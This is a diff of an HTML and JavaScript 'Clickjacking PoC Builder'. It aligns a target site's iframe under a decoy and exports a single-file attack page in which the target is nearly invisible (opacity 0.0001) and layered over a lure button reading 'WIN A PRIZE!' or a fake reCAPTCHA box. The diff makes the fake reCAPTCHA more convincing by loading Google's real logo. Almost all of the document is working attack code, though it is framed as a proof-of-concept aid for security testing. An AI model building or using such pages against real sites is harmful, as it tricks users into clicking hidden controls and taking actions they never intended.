@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <title>Clickjacking PoC Builder</title>
     <style>
-        body { font-family: sans-serif; background: #f0f0f0; margin: 0; overflow: hidden; }
+        body { font-family: 'Roboto', sans-serif; background: #f0f0f0; margin: 0; overflow: hidden; }
 
-        /* reCAPTCHA */
+        /* --- THE FAKE RECAPTCHA STYLES --- */
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -19,7 +19,6 @@
             box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
             position: absolute; 
             z-index: 50;
-            font-family: 'Roboto', sans-serif;
             user-select: none;
             cursor: pointer;
         }
@@ -47,39 +46,29 @@
             margin-left: auto;
         }
 
-        #recaptcha-logo-img {
+        .recaptcha-logo-img {
             width: 32px;
             height: 32px;
-            /* Simple CSS trick to make a "recycle" looking icon */
-            border: 2px solid #1A73E8;
-            border-radius: 50%;
-            border-top-color: transparent;
-            transform: rotate(45deg);
+            background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png");
+            background-size: 32px;
+            background-repeat: no-repeat;
         }
 
-        #recaptcha-logo-text {
+        .recaptcha-logo-text {
             font-size: 10px;
             color: #555;
-            margin-top: 4px;
-            font-weight: 500;
+            margin-top: 2px;
+            text-align: center;
         }
 
-        #recaptcha-logo-privacy-terms {
+        .recaptcha-privacy {
             font-size: 8px;
             color: #555;
-            margin-top: 2px;
+            margin-top: 0px;
+            text-align: center;
         }
-        
-        /* The Decoy Container */
-        #decoy_container {
-            position: absolute;
-            top: 300px;
-            left: 400px;
-            z-index: 50;
-            pointer-events: none;
-        }
-        
-        /* The Controls Panel */
+
+        /* --- CONTROLS & LAYOUT --- */
         #controls {
             position: fixed; top: 10px; left: 10px; z-index: 1000;
             background: white; padding: 15px; border: 1px solid #ccc;
@@ -87,17 +76,17 @@
             width: 250px;
         }
         
-        /* The Decoy Element (What the victim sees) */
-        #decoy_button {
-            background: #007bff;
-            color: white;
-            padding: 15px 15px;
-            border: none;
-            font-size: 16px;
-            font-weight: bold;
+        #decoy_container {
+            position: absolute; top: 300px; left: 400px; z-index: 50;
+            pointer-events: none; /* Pass clicks to iframe during calibration */
         }
 
-        /* The Iframe Container (Draggable) */
+        #decoy_button {
+            background: #007bff; color: white; padding: 15px 30px;
+            border: none; font-size: 16px; font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
         #iframe_container {
             position: absolute; top: 0; left: 0;
             width: 80%; height: 80%; z-index: 10;
@@ -105,48 +94,20 @@
         
         iframe {
             width: 100%; height: 100%; border: none;
-            opacity: 0.5; /* Default opacity for calibration */
-            pointer-events: none; /* Allow dragging overlay to capture events */
+            opacity: 0.5;
         }
 
-        /* Draggable Overlay */
+        /* --- DRAG & RESIZE VISUALS --- */
         #drag_overlay {
-            position: absolute; top: 0; left: 0;
-            width: 100%; height: 100%; z-index: 11;
-            cursor: grab;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 11;
+            cursor: grab; border: 2px dashed rgba(0,0,0,0.2);
         }
+        #drag_overlay.dragging { cursor: grabbing; border-color: rgba(0,0,0,0.5); }
         
-        #drag_overlay.dragging {
-            cursor: grabbing;
-        }
-
-        /* Resize Handles */
-        .resize-handle {
-            position: absolute;
-            background: lightseagreen;
-            z-index: 12;
-        }
-        
-        /* Corner Handles */
-        .resize-handle.corner {
-            width: 12px;
-            height: 12px;
-        }
-        
+        .resize-handle { position: absolute; background: #007bff; z-index: 12; }
+        .resize-handle.corner { width: 12px; height: 12px; border: 1px solid white; }
         .resize-handle.nw { top: -6px; left: -6px; cursor: nw-resize; }
-        .resize-handle.ne { top: -6px; right: -6px; cursor: ne-resize; }
-        .resize-handle.sw { bottom: -6px; left: -6px; cursor: sw-resize; }
         .resize-handle.se { bottom: -6px; right: -6px; cursor: se-resize; }
-        
-        /* Edge Handles */
-        .resize-handle.edge {
-            background: lightseagreen;
-        }
-        
-        .resize-handle.n { top: -4px; left: 50%; transform: translateX(-50%); width: 60px; height: 8px; cursor: n-resize; }
-        .resize-handle.s { bottom: -4px; left: 50%; transform: translateX(-50%); width: 60px; height: 8px; cursor: s-resize; }
-        .resize-handle.w { left: -4px; top: 50%; transform: translateY(-50%); width: 8px; height: 60px; cursor: w-resize; }
-        .resize-handle.e { right: -4px; top: 50%; transform: translateY(-50%); width: 8px; height: 60px; cursor: e-resize; }
 
         .label { font-size: 12px; color: #666; margin-top: 10px; display: block;}
     </style>
@@ -155,37 +116,37 @@
 
     <div id="controls">
         <h3>PoC Calibration</h3>
-        <p>1. Drag the page to align the target button under the Blue Decoy Button.</p>
-        <p>2. Click "Export Final HTML" when done.</p>
+        <p style="font-size:12px">1. Align the target button under the Decoy.</p>
+        <p style="font-size:12px">2. Export HTML when ready.</p>
         
         <label class="label">Target Opacity:</label>
         <input type="range" min="0" max="1" step="0.1" value="0.5" id="opacitySlider">
+        
         <label class="label">Decoy Type:</label>
         <select id="decoyType" style="width: 100%; margin-bottom: 10px;">
             <option value="button">Generic Blue Button</option>
             <option value="recaptcha">Fake reCAPTCHA</option>
         </select>
-        <label class="label">Decoy Label:</label>
-        <input type="text" value="Click to verify" id="decoyText" style="width: 100%">
+        
+        <label class="label">Decoy Text:</label>
+        <input type="text" value="WIN A PRIZE!" id="decoyText" style="width: 100%">
 
         <hr>
-        <button onclick="exportPoC()">Export Final HTML</button>
-        <p id="coords" style="font-size: 10px; font-family: monospace;"></p>
+        <button onclick="exportPoC()" style="width:100%; padding: 8px; cursor:pointer;">Export Final HTML</button>
+        <p id="coords" style="font-size: 10px; font-family: monospace; margin-top: 10px;"></p>
     </div>
 
     <div id="decoy_container">
         
-        <button id="decoy_button">
-            Click to verify
-        </button>
+        <button id="decoy_button">WIN A PRIZE!</button>
 
         <div id="decoy_recaptcha" class="recaptcha-box" style="display: none;">
             <div class="recaptcha-checkbox"></div>
             <div class="recaptcha-text">I'm not a robot</div>
             <div class="recaptcha-logo">
-                <div id="recaptcha-logo-img"></div>
-                <div id="recaptcha-logo-text">reCAPTCHA</div>
-                <div id="recaptcha-logo-privacy-terms">Privacy - Terms</div>
+                <div class="recaptcha-logo-img"></div>
+                <div class="recaptcha-logo-text">reCAPTCHA</div>
+                <div class="recaptcha-privacy">Privacy - Terms</div>
             </div>
         </div>
 
@@ -194,15 +155,8 @@
     <div id="iframe_container">
         <iframe id="target_frame" src="{{TARGET_URL}}"></iframe>
         <div id="drag_overlay"></div>
-        <!-- Resize Handles -->
         <div class="resize-handle corner nw" data-direction="nw"></div>
-        <div class="resize-handle corner ne" data-direction="ne"></div>
-        <div class="resize-handle corner sw" data-direction="sw"></div>
         <div class="resize-handle corner se" data-direction="se"></div>
-        <div class="resize-handle edge n" data-direction="n"></div>
-        <div class="resize-handle edge s" data-direction="s"></div>
-        <div class="resize-handle edge w" data-direction="w"></div>
-        <div class="resize-handle edge e" data-direction="e"></div>
     </div>
 
     <script>
@@ -211,44 +165,40 @@
         const slider = document.getElementById('opacitySlider');
         const frame = document.getElementById('target_frame');
         const decoyBtn = document.getElementById('decoy_button');
-        const decoyInput = document.getElementById('decoyText');
-        const resizeHandles = document.querySelectorAll('.resize-handle');
-        const decoyTypeSelect = document.getElementById('decoyType');
-        const btnDecoy = document.getElementById('decoy_button');
-        const captchaDecoy = document.getElementById('decoy_recaptcha');
-        const decoyContainer = document.getElementById('decoy_container');
+        const decoyRecaptcha = document.getElementById('decoy_recaptcha');
+        const decoyType = document.getElementById('decoyType');
+        const decoyText = document.getElementById('decoyText');
         
         let isDragging = false;
         let isResizing = false;
-        let resizeDirection = null;
         let startX, startY, initialLeft, initialTop, initialWidth, initialHeight;
+        let resizeDir = '';
 
-        decoyTypeSelect.addEventListener('change', (e) => {
-            if (e.target.value === 'recaptcha') {
-                btnDecoy.style.display = 'none';
-                captchaDecoy.style.display = 'flex';
-                // Disable text input for reCAPTCHA as text is static
-                decoyInput.disabled = true; 
+        // Toggle Decoy Type
+        decoyType.addEventListener('change', (e) => {
+            if(e.target.value === 'recaptcha'){
+                decoyBtn.style.display = 'none';
+                decoyRecaptcha.style.display = 'flex';
+                decoyText.disabled = true;
             } else {
-                btnDecoy.style.display = 'block';
-                captchaDecoy.style.display = 'none';
-                decoyInput.disabled = false;
+                decoyBtn.style.display = 'block';
+                decoyRecaptcha.style.display = 'none';
+                decoyText.disabled = false;
             }
         });
 
-        // Opacity Control
+        // Update Text
+        decoyText.addEventListener('input', (e) => {
+            decoyBtn.innerText = e.target.value;
+        });
+
+        // Opacity
         slider.addEventListener('input', (e) => {
             frame.style.opacity = e.target.value;
         });
 
-        // Update Button Text
-        decoyInput.addEventListener('input', (e) => {
-            decoyBtn.innerText = e.target.value;
-        });
-
-        // Dragging Logic for the Container (using overlay to capture events)
+        // Dragging Logic
         overlay.addEventListener('mousedown', (e) => {
-            if (isResizing) return; // Don't drag while resizing
             isDragging = true;
             startX = e.clientX;
             startY = e.clientY;
@@ -256,26 +206,25 @@
             initialTop = container.offsetTop;
             overlay.classList.add('dragging');
         });
-        
-        // Resize Logic
-        resizeHandles.forEach(handle => {
+
+        // Resizing Logic
+        document.querySelectorAll('.resize-handle').forEach(handle => {
             handle.addEventListener('mousedown', (e) => {
-                e.stopPropagation(); // Prevent drag from triggering
+                e.stopPropagation();
                 isResizing = true;
-                resizeDirection = handle.dataset.direction;
+                resizeDir = handle.dataset.direction;
                 startX = e.clientX;
                 startY = e.clientY;
-                initialLeft = container.offsetLeft;
-                initialTop = container.offsetTop;
                 initialWidth = container.offsetWidth;
                 initialHeight = container.offsetHeight;
+                initialLeft = container.offsetLeft;
+                initialTop = container.offsetTop;
             });
         });
 
         window.addEventListener('mouseup', () => {
             isDragging = false;
             isResizing = false;
-            resizeDirection = null;
             overlay.classList.remove('dragging');
             updateCoords();
         });
@@ -289,93 +238,79 @@
             } else if (isResizing) {
                 const dx = e.clientX - startX;
                 const dy = e.clientY - startY;
-                
-                let newWidth = initialWidth;
-                let newHeight = initialHeight;
-                let newLeft = initialLeft;
-                let newTop = initialTop;
-                
-                // Handle each resize direction
-                if (resizeDirection.includes('e')) {
-                    newWidth = initialWidth + dx;
-                }
-                if (resizeDirection.includes('w')) {
-                    newWidth = initialWidth - dx;
-                    newLeft = initialLeft + dx;
-                }
-                if (resizeDirection.includes('s')) {
-                    newHeight = initialHeight + dy;
-                }
-                if (resizeDirection.includes('n')) {
-                    newHeight = initialHeight - dy;
-                    newTop = initialTop + dy;
-                }
-                
-                // Apply minimum size constraints
-                if (newWidth >= 100) {
-                    container.style.width = `${newWidth}px`;
-                    if (resizeDirection.includes('w')) {
-                        container.style.left = `${newLeft}px`;
-                    }
-                }
-                if (newHeight >= 100) {
-                    container.style.height = `${newHeight}px`;
-                    if (resizeDirection.includes('n')) {
-                        container.style.top = `${newTop}px`;
-                    }
+                if(resizeDir === 'se') {
+                    container.style.width = `${initialWidth + dx}px`;
+                    container.style.height = `${initialHeight + dy}px`;
+                } else if(resizeDir === 'nw') {
+                    container.style.width = `${initialWidth - dx}px`;
+                    container.style.height = `${initialHeight - dy}px`;
+                    container.style.left = `${initialLeft + dx}px`;
+                    container.style.top = `${initialTop + dy}px`;
                 }
             }
         });
 
         function updateCoords() {
-            const coords = `Pos: ${container.style.top || '0px'}, ${container.style.left || '0px'} | Size: ${container.style.width || '100%'}, ${container.style.height || '100%'}`;
-            document.getElementById('coords').innerText = coords;
+            document.getElementById('coords').innerText = 
+                `Pos: ${container.style.left}, ${container.style.top} | Size: ${container.style.width} x ${container.style.height}`;
         }
 
         function exportPoC() {
-            let activeDecoyHTML = "";
+            let style = "";
+            let html = "";
             
-            if (decoyTypeSelect.value === 'recaptcha') {
-                activeDecoyHTML = `
-        <style>
-        /* Minified CSS for the captcha to keep the PoC single-file */
-        .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 12px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); font-family: sans-serif; cursor: pointer; }
-        .recaptcha-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background-color: #fff; margin-right: 12px; }
-        .recaptcha-text { font-size: 14px; color: #000; font-weight: 500; flex-grow: 1; }
-        .recaptcha-logo-img { width: 32px; height: 32px; border: 2px solid #1A73E8; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
-        .recaptcha-logo-text { font-size: 10px; color: #555; text-align: center; }
-        </style>
-        <div class="recaptcha-box">
-            <div class="recaptcha-checkbox"></div>
-            <div class="recaptcha-text">I'm not a robot</div>
-            <div>
-                <div class="recaptcha-logo-img"></div>
-                <div class="recaptcha-logo-text">reCAPTCHA</div>
-            </div>
-        </div>`;
+            // Get current iframe values, falling back to defaults if not set
+            const top = container.style.top || '0';
+            const left = container.style.left || '0';
+            const width = container.style.width || '80%';
+            const height = container.style.height || '80%';
+            
+            if(decoyType.value === 'recaptcha') {
+                style = `
+                .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 12px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); font-family: 'Roboto', sans-serif; cursor: pointer; user-select: none; position: absolute; top: 300px; left: 400px; z-index: 1; }
+                .recaptcha-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background-color: #fff; margin-right: 12px; }
+                .recaptcha-text { font-size: 14px; color: #000; font-weight: 500; flex-grow: 1; }
+                .recaptcha-logo-img { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: 32px; background-repeat: no-repeat; margin: 0 auto; }
+                .recaptcha-logo-text { font-size: 10px; color: #555; text-align: center; margin-top: 2px; }
+                .recaptcha-privacy { font-size: 8px; color: #555; text-align: center; }`;
+                
+                html = `
+                <div class="recaptcha-box">
+                    <div class="recaptcha-checkbox"></div>
+                    <div class="recaptcha-text">I'm not a robot</div>
+                    <div>
+                        <div class="recaptcha-logo-img"></div>
+                        <div class="recaptcha-logo-text">reCAPTCHA</div>
+                        <div class="recaptcha-privacy">Privacy - Terms</div>
+                    </div>
+                </div>`;
             } else {
-                activeDecoyHTML = `<button style="background: #007bff; color: white; padding: 15px 30px; border: none; font-size: 16px; font-weight: bold;">${decoyBtn.innerText}</button>`;
+                style = `#decoy { position: absolute; top: 300px; left: 400px; z-index: 1; background: #007bff; color: white; padding: 15px 30px; border: none; font-size: 16px; font-weight: bold; }`;
+                html = `<button id="decoy">${decoyBtn.innerText}</button>`;
             }
 
-            const html = `
+            const finalCode = `
+        <!DOCTYPE html>
+        <html>
+        <head>
         <style>
             body { margin: 0; overflow: hidden; height: 100vh; }
-            #target { 
-                position: absolute; opacity: 0; 
-                top: ${container.style.top || '0px'}; left: ${container.style.left || '0px'}; 
-                width: ${container.style.width || '100%'}; height: ${container.style.height || '100%'}; z-index: 2; 
+            #target_frame { 
+                position: absolute; 
+                top: ${top}; left: ${left}; 
+                width: ${width}; height: ${height}; 
+                opacity: 0.0001; z-index: 2; border: none; 
             }
-            #decoy-wrapper { 
-                position: absolute; top: 300px; left: 400px; z-index: 1;
-            }
+            ${style}
         </style>
-        <div id="decoy-wrapper">
-            ${activeDecoyHTML}
-        </div>
-        <iframe id="target" src="${frame.src}"></iframe>
-            `;
-            console.log(html);
-            alert("PoC HTML copied to console! (F12)");
+        </head>
+        <body>
+            ${html}
+            <iframe id="target_frame" src="${frame.src}"></iframe>
+        </body>
+        </html>`;
+            console.log(finalCode);
+            alert("PoC HTML code has been logged to the Developer Console (F12)!");
         }
     </script>
 </body>
